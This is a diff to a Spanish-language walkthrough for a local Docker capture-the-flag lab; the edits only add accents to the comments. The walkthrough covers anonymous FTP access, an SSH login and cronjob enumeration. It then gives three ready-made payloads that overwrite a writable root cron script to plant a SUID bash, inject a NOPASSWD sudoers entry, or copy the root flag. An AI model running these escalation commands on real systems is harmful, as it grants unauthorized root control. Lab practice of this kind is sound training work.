@@ -4,7 +4,7 @@
 |       Objetivo: Encontrar user.txt y root.txt|
 +---------------------------------------------+
 
-# 1. Limpiar imagenes y contenedores previos (si existen)
+# 1. Limpiar imágenes y contenedores previos (si existen)
 sudo docker stop ftp-vuln 2>/dev/null; sudo docker rm ftp-vuln 2>/dev/null
 sudo docker rmi ftp-vuln 2>/dev/null
 
@@ -17,7 +17,7 @@ sudo docker run -d --name ftp-vuln -p 2121:21 -p 2222:22 -p 30000-30010:30000-30
 # 4. Escanear servicios con nmap
 nmap -sC -sV -p 2121,2222 localhost
 
-# 5. FTP anonimo (obligatorio -p para modo pasivo)
+# 5. FTP anónimo (obligatorio -p para modo pasivo)
 ftp -p localhost 2121
 # Name: anonymous
 # Password: [ENTER]
@@ -32,9 +32,9 @@ ssh oramiuser@localhost -p 2222
 # cat user.txt
 
 # 7. Enumerar cronjobs (dentro del SSH)
-# Por que buscar cronjobs? Despues de obtener acceso como usuario normal,
+# Por qué buscar cronjobs? Después de obtener acceso como usuario normal,
 # el siguiente objetivo es escalar a root. Los cronjobs son un vector
-# comun porque se ejecutan automaticamente y suelen correr como root.
+# común porque se ejecutan automáticamente y suelen correr como root.
 # Si el script que ejecutan es modificable por cualquier usuario,
 # un atacante puede reemplazarlo con un payload malicioso.
 #
@@ -50,21 +50,21 @@ ls -l /usr/local/bin/backup.sh
 
 # 8. Escalar a root (elegir una opcion)
 
-# Opcion A (SUID):
+# Opción A (SUID):
 echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /usr/local/bin/backup.sh
 chmod +x /usr/local/bin/backup.sh
 # Esperar 1 minuto
 /tmp/rootbash -p
 cat /root/root.txt
 
-# Opcion B (sudoers):
+# Opción B (sudoers):
 echo -e '#!/bin/bash\nchmod 777 /etc/sudoers\necho "oramiuser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\nchmod 440 /etc/sudoers' > /usr/local/bin/backup.sh
 chmod +x /usr/local/bin/backup.sh
 # Esperar 1 minuto
 sudo su
 cat /root/root.txt
 
-# Opcion C (copiar flag a /tmp):
+# Opción C (copiar flag a /tmp):
 echo -e '#!/bin/bash\ncp /root/root.txt /tmp/root.txt\nchmod 777 /tmp/root.txt' > /usr/local/bin/backup.sh
 # Esperar 1 minuto a que el cronjob ejecute backup.sh
 cat /tmp/root.txt
